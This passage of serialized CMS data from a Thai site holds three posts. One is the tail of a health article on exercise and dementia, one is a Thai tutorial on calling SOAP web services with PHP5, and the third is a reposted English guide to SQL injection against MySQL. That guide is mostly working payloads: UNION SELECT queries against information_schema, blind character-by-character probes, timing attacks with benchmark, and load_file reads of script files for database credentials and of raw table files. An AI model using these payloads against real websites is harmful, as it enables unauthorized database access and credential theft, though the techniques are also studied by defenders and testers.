+เพราะ ฉะนั้นถ้าใครที่ไม่อยากจะเจอภาวะสมองเสื่อมเร็วกว่ากำหนดละก็ ต้องเริ่มออกกำลังกายเสียตั้งแต่วันนี้แล้วนะคะ เพราะนอกจากจะช่วยป้องกันสมองเสื่อมเร็วแล้ว ยังช่วยให้ร่างกายแข็งแรงสามารถสู้รบกับโรคภัยต่าง ๆ ได้ด้วยค่ะ</span></p>
+<p><span style="font-family: Arial;"><br />
+&nbsp; <br />
+</span></p>";s:9:"post_date";s:10:"2009-02-11";}i:8;a:6:{s:10:"content_id";s:2:"10";s:11:"category_id";s:1:"1";s:12:"content_name";s:89:"การใช้ PHP5 เรียกเว็บเซอร์วิสแบบ SOAP";s:15:"content_summary";s:1156:"<p><span style="font-family: Arial;"><span style="font-size: smaller;"><img height="64" width="111" alt="" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/php.jpg" /></span></span></p>
+<p><span style="font-family: Arial;"><span style="font-size: smaller;">ไปพบใน Narisa มาครับเห็นว่ามีประโยชน์ ขอบคุณต้นฉบับด้วยนะครับ <br />
+http://www.narisa.com/forums/index.php?showtopic=23153<br />
+</span></span></p>
+<p>&nbsp;</p>
+<p><br />
+<span style="font-family: Arial;"><span style="font-size: smaller;"> ภาษา PHP เป็นภาษาที่เหมาะสมในการพัฒนาเว็บแอปพลิเคชัน <br />
+เนื่องจากเป็นภาษาที่ง่าย เรียนรู้ได้เร็ว <br />
+และสามารถนำมาใช้ได้ฟรี การเรียกใช้เว็บเซอร์วิสด้วยภาษา PHP จึงเป็นที่นิยม&nbsp;</span></span></p>
+<p>&nbsp;</p>";s:14:"content_detail";s:6288:"<p><span style="font-family: Arial;">ไปพบใน Narisa มาครับเห็นว่ามีประโยชน์ ขอบคุณต้นฉบับด้วยนะครับ http://www.narisa.com/forums/index.php?showtopic=23153<br />
+<br />
+ภาษา PHP เป็นภาษาที่เหมาะสมในการพัฒนาเว็บแอปพลิเคชัน เนื่องจากเป็นภาษาที่ง่าย เรียนรู้ได้เร็ว และสามารถนำมาใช้ได้ฟรี <br />
+การเรียกใช้เว็บเซอร์วิสด้วยภาษา PHP จึงเป็นที่นิยม ภาษา PHP เวอร์ชันปัจจุบันคือ PHP5 ซึ่งมีความสามารถในการสนับสนุนการเรียกใช้เว็บเซอร์วิสในตัวโดยไม่ต้องดาวน์ โหลดเครื่องมืออะไรเพิ่มเติม ซึ่งจะทำให้ง่ายกว่าการที่ต้องไปดาวน์โหลดเครื่องมืออย่างเช่น NuSOAP ซึ่ง อัปเดตล่าสุดในปี ค.ศ. 2005 อีกทั้งไม่ได้มีกลุ่มผู้ใช้อย่างมากเหมือนกับ SOAP extension ของ PHP5<br />
+<br />
+ใน PHP5 มี SOAP extension  ที่ทำให้การเรียกใช้เว็บเซอร์วิสแบบ SOAP ง่ายขึ้นโดยการใช้คลาส  SoapClient<br />
+<br />
+ขั้นตอนวิธีการมีดังต่อไปนี้<br />
+<br />
+1)  หากเราต้องการเรียกใช้เว็บเซอร์วิสแบบ SOAP ใดเราก็ต้องรู้ที่อยู่ของเอกสาร WSDL  ของเว็บเซอร์วิสนั้นก่อน เช่น<br />
+<br />
+$client = new  SoapClient($wsdl);<br />
+<br />
+ถ้าหากว่าพบปัญหา Class 'SoapClient' not found  ให้เพิ่มบรรทัดนี้ในไฟล์  php.ini<br />
+<br />
+extension=php_soap.dll<br />
+<br />
+ซึ่งถ้าหากใช้ระบบปฏิบัติการ Windows  ไฟล์ php.ini อยู่ที่ไดเรกทอรี c:\windows<br />
+<br />
+2) จากนั้นใช้ฟังก์ชัน _soapCall  เพื่อเรียกใช้เมธอดที่เราต้องการโดยที่จะต้องระบุอินพุตพารามิเตอร์ในรูปแบบอาร์เรย์  เช่น<br />
+<br />
+$result = $client-&gt;__soapCall($methodName,  array($methodArguments));<br />
+<br />
+3) ถ้าหากเราเรียกใช้เว็บเซอร์วิสที่พัฒนาโดยใช้ Microsoft .NET จะต้องมีการระบุ SOAP Action ในอาร์กิวเมนต์ของฟังก์ชัน __soapCall เช่น<br />
+<br />
+$result = $client-&gt;__soapCall($methodName,  array($methodArguments), array('soapaction' =&gt; $soapAction));<br />
+<br />
+4) ถ้าหากเราเรียกใช้เว็บเซอร์วิสที่พัฒนาโดย Microsoft .NET จะได้ผลลัพธ์ที่อยู่ในรูปออปเจตก์ที่ประกอบด้วยอิลิเมนต์ที่มีชื่อตรงกับอิล ิเมนต์เอาต์พุตตามที่ระบุในเอกสาร WSDL เช่น<br />
+<br />
+echo  $result-&gt;outputElemName;<br />
+<br />
+เรา ลองมาดูตัวอย่างของการเรียกใช้เว็บเซอร์วิส ปตท (http://www.pttplc.com/pttinfo.asmx) ซึ่งพัฒนาเป็นเว็บเซอร์วิสแบบ SOAP โดยใช้ C#.NET ด้วยโปรแกรมที่เขียนโดยภาษา PHP ดังนี้<br />
+<br />
+<br />
+<br />
+&lt;?php<br />
+<br />
+// ที่อยู่ของเอกสาร WSDL ของเว็บเซอร์วิส  ปตท&quot;);<br />
+$wsdl = 'http://www.pttplc.com/pttinfo.asmx?WSDL';<br />
+<br />
+//  สร้างออปเจกต์ SoapClient เพื่อเรียกใช้เว็บเซอร์วิส<br />
+$client = new  SoapClient($wsdl);<br />
+<br />
+<br />
+// เมธอดที่ต้องการเรียกใช้  CurrentOilPrice<br />
+$methodName = 'CurrentOilPrice';<br />
+<br />
+<br />
+//  อินพุตพารามิเตอร์ของเมธอด CurrentOilPrice คือ<br />
+// Language  ซึ่งเราตั้งค่าให้เป็น TH ถ้าหากต้องการแสดงผลเป็นภาษาไทย<br />
+$params =  array('Language'=&gt;'TH');<br />
+<br />
+// ระบุค่าของ SOAP Action URI<br />
+$soapAction  = 'http://www.pttplc.com/ptt_webservice/CurrentOilPrice';<br />
+<br />
+// ใช้ฟังก์ชัน  _soapCall ในการเรียกเมธอดที่ระบุ<br />
+// ต้องระบุพารามิเตอร์และ SOAP  Action<br />
+$objectResult = $client-&gt;__soapCall($methodName, array('parameters'  =&gt; $params), array('soapaction' =&gt; $soapAction));<br />
+<br />
+//  จะต้องดูค่าฟิลด์ที่ชื่อตรงกับชื่อของอิลิเมนต์ที่ระบุใน<br />
+// Output Message  ซึ่งในที่นี้ก็คือ<br />
+// CurrentOilPriceResult<br />
+echo  $objectResult-&gt;CurrentOilPriceResult;<br />
+<!--{12343468862510}-->?&gt;</span></p>";s:9:"post_date";s:10:"2009-02-11";}i:9;a:6:{s:10:"content_id";s:1:"9";s:11:"category_id";s:2:"23";s:12:"content_name";s:28:"MySQL table and column names";s:15:"content_summary";s:612:"<p><img height="120" width="120" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/database.jpg" alt="" /></p>
+<p>Getting&nbsp;the table and column names within a SQL injection attack is often a problem and I&rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databases I recommend the extensive cheat sheets from <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">pentestmonkey</a>.</p>";s:14:"content_detail";s:14599:"<h2><a title="Permanent Link: MySQL table and column&nbsp;names" rel="bookmark" href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/"><br />
+</a></h2>
+<div class="snap_preview">
+<p>Getting&nbsp;the table and column names within a SQL injection attack is often a problem and I&rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databases I recommend the extensive cheat sheets from <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">pentestmonkey</a>.</p>
+<p><strong>Please note that attacking websites you are not allowed to attack is a crime and should not be done. This article is for learning purposes only.</strong></p>
+<p><a title="article&nbsp;overview" href="http://websec.files.wordpress.com/2007/11/names_overview.png"><img alt="article&nbsp;overview" src="http://websec.files.wordpress.com/2007/11/names_overview.png" /></a></p>
+<p>For the following injections I&rsquo;ll assume you understand the <a href="http://www.google.com/search?q=SQL%20injection">basics of SQL injection</a> and <a href="http://dev.mysql.com/doc/refman/5.1/en/union.html">union select</a>. My injections are written for&nbsp;a SELECT query with&nbsp;two columns, however don&rsquo;t forget to add <em>null</em>s <a href="http://devels-playground.blogspot.com/2007/08/union-select-column-count.html">in the right amount</a>.</p>
+<p><a title="1" name="1"></a><strong>1. The information_schema table</strong></p>
+<p><a title="1.a" name="1.a"></a><strong>1.a. Read information_schema table normally</strong></p>
+<p>Sometimes on MySQL &gt;=5.0 you can access the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-schema.html">information_schema table</a>.<br />
+So you may want to check which MySQL version is running:<br />
+<em><strong>0&prime; UNION SELECT version(),null /*</strong></em><br />
+or:<br />
+<em><strong>0&prime; UNION SELECT @@version,null /*</strong></em></p>
+<p>Once you know which version is running, proceed with these steps (MySQL &gt;= 5.0) or <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">jump to the next point</a>.</p>
+<p>You can either get the names step by step or at once.</p>
+<p>First, get the <em>tablenames</em>:<br />
+<em><strong>0&prime; UNION SELECT table_name,null FROM information_schema.tables WHERE version = &lsquo;9</strong></em><br />
+Note that <em>version=9</em> has nothing to do with the MySQL version. It&rsquo;s just an unique identifier for user generated tables, so leave as it is to ignore MySQL system table names.<br />
+<b>update:</b> Testing another MySQL version (5.0.51a) I noticed that the version is &ldquo;10&Prime; for user generated tables. so dont worry if you dont get any results. instead of the unique identifier you can also use &ldquo;LIMIT offset,amount&rdquo;.</p>
+<p>Second, get the <em>columnnames</em>:<br />
+<em><strong>0&prime; UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = &lsquo;tablename</strong></em></p>
+<p>Or with one injection:<br />
+<em><strong>0&prime; UNION SELECT column_name,table_name FROM information_schema.columns /*</strong></em><br />
+Unfortunetly there is no unique identifier, so you have to scroll through the whole information_schema table if you use this.</p>
+<p>Once you know table name and column name you can <em>union select</em> all the data you need.</p>
+<p>For more details about the information_schema table see the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-schema.html">MySQL Documentation Library</a>. There you&rsquo;ll find other interesting columns you can add instead of <em>null</em>, for example <em>data_type</em>.</p>
+<p>Ok, that was the easiest part.</p>
+<p><a title="1.b" name="1.b"></a><strong>1.b. Read information_schema table blindly</strong></p>
+<p>Sometimes you can&rsquo;t see the output of your request, however there are some techniques to get the info blindly, called <a href="http://www.imperva.com/download.asp?id=4">Blind SQL Injection</a>. I&rsquo;ll assume you know the basics.<br />
+However, make sure you really need to use blind injection. Often you just have to make sure the actual result returns null and the output of your injection gets processed by the mysql_functions instead. Use something like <em> AND 1=0</em> to make sure the actual output is null and then append your union select to get your data, for example:<br />
+<em><strong>1&prime; AND 1=0 UNION SELECT @@version,null /*</strong></em></p>
+<p>If you really need blind SQL injection we&rsquo;ll go through the same steps as above, so first we try to get the version:<br />
+<em><strong>1&prime;AND <a href="http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring">MID</a>(version(),1,1) like &lsquo;4</strong></em></p>
+<p>The request will be successfull and the same page will be displayed like as we did no injection if the version starts with &ldquo;4&Prime;. If not, I&rsquo;ll guess the server is running MySQL 5. Check it out:<br />
+<em><strong>1&prime;AND <a href="http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring">MID</a>(version(),1,1) like &lsquo;5</strong></em></p>
+<p>Always remember to put a value before the actual injection which would give &ldquo;normal&rdquo; output. If the output does not differ, no matter what you&rsquo;ll inject try some benchmark tests:<br />
+<em><strong>1&prime; UNION SELECT (if(mid(version(),1,1) like 4, <a href="http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark">benchmark</a>(100000,sha1(&rsquo;test&rsquo;)), &lsquo;false&rsquo;)),null /*</strong></em><br />
+But be careful with the benchmark values, you dont want to crash your browser ;-). I&rsquo;d suggest you to try some values first to get a acceptable response time.</p>
+<p>Once we know the version number you can proceed with these steps (MySQL &gt;= 5.0) or <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">jump to the next point</a>.</p>
+<p>Since we cant read out the table name we have to brute it. Yes, that can be annoying, but who said it would be easy?<br />
+We&rsquo;ll use the same injection as in 1.), but now with blind injection technique:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),1,1) &gt; &lsquo;m</strong></em></p>
+<p>Again, this will check if the first letter of our first table is alphabetically located behind &ldquo;m&rdquo;. As stated above, <em>version=9</em> has nothing to do with the MySQL version number and is used here to fetch only user generated tables.<br />
+Once you got the right letter, move on to the next:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),2,1) &gt; &lsquo;m</strong></em><br />
+And so on.</p>
+<p>If you got the tablename you can brute its columns. This works as the same principle:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),1,1) &gt; &lsquo;m</strong></em><br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),2,1) &gt; &lsquo;m</strong></em><br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),3,1) &gt; &lsquo;m</strong></em><br />
+And so on.</p>
+<p>To check the next name, just skip the first bruted <em>tablename</em> with <a href="http://dev.mysql.com/doc/refman/5.1/de/select.html">LIMIT</a> (see comments for more details about the index):<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1,1),1,1) &gt; &lsquo;m</strong></em><br />
+Or <em>columnname</em>:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1,1),1,1) &gt; &lsquo;m</strong></em></p>
+<p>Sometimes it also makes sense to check the length of the name first, so maybe you can guess it easier the more letters you reveal.<br />
+Check for the tablename:<br />
+<em><strong>1&prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),6,1)=&rsquo;</strong></em><br />
+Or for the column name:<br />
+<em><strong>1&prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &lsquo;tablename&rsquo; LIMIT 1),6,1)=&rsquo;</strong></em><br />
+Both injections check if the sixth letter is not empty. If it is, and the fifth letter exists, you know the name is 5 letters long.</p>
+<p>Since we know that the information_schema table has 33 entries by default we can also check out how many user generated tables exist. That means that every entry more than 33 is a table created by a user.<br />
+If the following succeeds, it means that there is one user generated table:<br />
+<em><strong>1&prime; AND 34=(SELECT COUNT(*) FROM information_schema.tables)/*</strong></em><br />
+There are two tables if the following is true:<br />
+<em><strong>1&prime; AND 35=(SELECT COUNT(*) FROM information_schema.tables)/*</strong></em><br />
+And so on.</p>
+<p><a title="2" name="2"></a><strong>2. You don&rsquo;t have access to information_schema table</strong></p>
+<p>If you don&rsquo;t have access to the information_schema table (default) or hit a MySQL version &lt; 5.0 it&rsquo;s quite difficult on MySQL.<br />
+There is only one error message I could find that reveals a name:<br />
+<em><strong>1&prime;%&rsquo;0</strong></em><br />
+<em>Query failed: Column &lsquo;id&rsquo; cannot be null</em></p>
+<p>But that doesnt give you info on other column or table names and only works if you can access error messages. However, it could make guessing the other names easier.</p>
+<p>If you don&rsquo;t want to use a bruteforce tool we will have to use <a href="http://dev.mysql.com/doc/refman/4.1/en/string-functions.html#function_load-file">load_file</a>. But that will require that you can see the output of course.</p>
+<p><em>&ldquo;To use this function, the file must be located on the server host, you must specify the full pathname to the file, and you must have the FILE privilege. The file must be readable by all and its size less than max_allowed_packet bytes.&rdquo;</em></p>
+<p>You can read out <a href="http://dev.mysql.com/doc/refman/5.1/de/program-variables.html">max_allowed_packet</a> on MySQL 5<br />
+<em><strong>0&prime; UNION SELECT @@max_allowed_packet,null /*</strong></em><br />
+Mostly you&rsquo;ll find the standard value <em>1047552</em> (Byte).</p>
+<p>Note that load_file always starts to look in the <em>datadir</em>. You can read out the datadir with:<br />
+<em><strong>0&prime; UNION SELECT @@datadir,null /*</strong></em><br />
+So if your <em>datadir</em> is <em>/var/lib/mysql</em> for example, <em>load_file(&rsquo;file.txt&rsquo;)</em> will look for <em>/var/lib/mysql/file.txt</em>.</p>
+<p><a title="2.a" name="2.a"></a><strong>2.a. Read the script file</strong></p>
+<p>Now, the first thing I would try is to load the actual script file. This not only gives you the exact query with all table and column names, but also the database connection credentials. A file read <em>could</em> look like this:</p>
+<p><em><strong>0&prime; UNION SELECT load_file(&rsquo;../../../../Apache/htdocs/path/file.php&rsquo;),null /*</strong></em> (Windows)<br />
+<em><strong>0&prime; UNION SELECT load_file(&rsquo;../../../var/www/path/file.php&rsquo;),null /*</strong></em> (Linux)</p>
+<p>The amount of directories you have to jump back with <em>../</em> is the amount of directories the <em>datadir</em> path has. After that follows the webserver path.<br />
+All about file privileges and webserver path can be found in my <a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">article about into outfile</a>.<br />
+Once you got the script you can also use <em>into outfile</em> combined with <em>OR 1=1</em> to write the whole output to a file or to set up a little PHP script on the target webserver which reads out the whole database (or the information you want) for you.</p>
+<p><a title="2.b" name="2.b"></a><strong>2.b) Read the database file</strong></p>
+<p>On MySQL 4&nbsp;and&nbsp;5 you can also use <em>load_file</em> to get the table content.</p>
+<p>The database files are usually stored in<br />
+<em>@@datadir/databasename/</em></p>
+<p>Take a look at <a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2">step 2.</a> how to get the <em>datadir</em>. An injection we need to read the database content looks like this:</p>
+<p><em><strong>0&prime; UNION SELECT load_file(&rsquo;databasename/tablename.MYD&rsquo;),null /*</strong></em></p>
+<p>As you can see we need the databasename and tablename first. The databasename is easy:<br />
+<em><strong>0&prime; UNION SELECT database(),null /*</strong></em></p>
+<p>The table name is the hard part. Actually you can only guess or bruteforce it with a good wordlist and something like:</p>
+<p><em><strong>0&prime; UNION SELECT &rsquo;success&rsquo;,null FROM testname /*</strong></em></p>
+<p>This will throw an error if testname does not exists, or display &ldquo;success&rdquo; if tablename testname exists.<br />
+If you try to guess the name, have a look at all errors, vars and html sources you can get to get an idea of how they could have named the table / columns. Often it is not as difficult as it seems first.<br />
+You can find a small wordlist for common tablenames <a href="http://raz0r.name/wp-content/uploads/2008/06/common_tbl.txt">here</a> (by Raz0r).</p>
+<p>Also note that the file loaded with <em>load_file()</em> must be smaller than <em>max_allowed_packet</em> so this wont work on huge database files, because the standard value is ~1 MB which will suffice for <em>only</em> about 100.000 entries (if my calculation is right ;-))</p>
+<p><a title="2.c" name="2.c"></a><strong>(2.c. Compromising the server)</strong></p>
+<p>There are no other ways to get the data as far as I know, except of compromising the server via <a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">MySQL into outfile</a> or with other techniques which are beyond the scope of this article (e.g. LFI).</p>
+<p>&nbsp;</p>
+</div>
+<p>&nbsp;</p>";s:9:"post_date";s:10:"2008-11-19";}}s:11:"currentPage";i:1;s:14:"numberOfRecord";s:2:"11";s:12:"numberOfPage";d:2;}
